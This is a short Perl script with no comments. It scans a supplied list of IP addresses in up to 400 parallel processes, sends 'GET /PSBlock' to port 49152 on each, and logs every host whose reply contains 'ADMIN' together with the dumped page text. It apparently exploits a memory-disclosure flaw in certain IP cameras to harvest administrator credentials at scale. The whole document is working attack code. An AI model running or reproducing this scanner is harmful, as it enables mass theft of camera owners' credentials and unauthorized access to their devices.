#!/usr/bin/perl  


use IO::Socket;
use IO::Socket::Timeout;

my $vnclist = $ARGV[0];
open my $vncs, '<', $vnclist;
chomp( my @vncs = <$vncs> );
close $vncs;

my @pids;
my $max = 400;
my $children = 0;

for my $i (@vncs) {
      my $pid;

      if($children == $max) {
            $pid = wait();
            $children--;
      }
       
      if(defined($pid = fork())) {
            if($pid) {
                  $children++;
                  push @pids, $pid;
            } else {
                  child($i);
                  exit;
            }
      } else {
            print "Error: failed to fork\n";
            exit;
      }
}


for my $pid(@pids) {
      waitpid $pid, 0;
}
print "DONE.\n";


sub child() {
      my $ip = $_[0];
	print "[\e[0;33m!\e[0m] \e[0;32mStarting $ip\e[0m\n";
            my $socket = IO::Socket::INET->new(
                Proto => 'tcp',
                PeerAddr => $ip,
                PeerPort => '49152',
                Timeout => '8',
            ) or die;
        
	print $socket "GET /PSBlock\n";
	IO::Socket::Timeout->enable_timeouts_on($socket);
	$socket->read_timeout(4);
my $response = <$socket>;	
 if (!defined $response && 0+$! == ETIMEDOUT) {
    die "timeout reading on the socket";
  	}        
	my @array = <$socket>;
        my $pagetext = join( '', @array );
        $pagetext =~ s/[^[:print:]]/ /g;
        $pagetext =~ s/( )\1+/$1/gi;

if ($pagetext =~ /ADMIN/) {
print "[\e[0;32m+\e[0m] \e[0;32mFound $ip\e[0m\n";
open (FILE, ">>filterme.txt");
print FILE "$ip $pagetext\n";
close FILE;
       }
      exit;
}
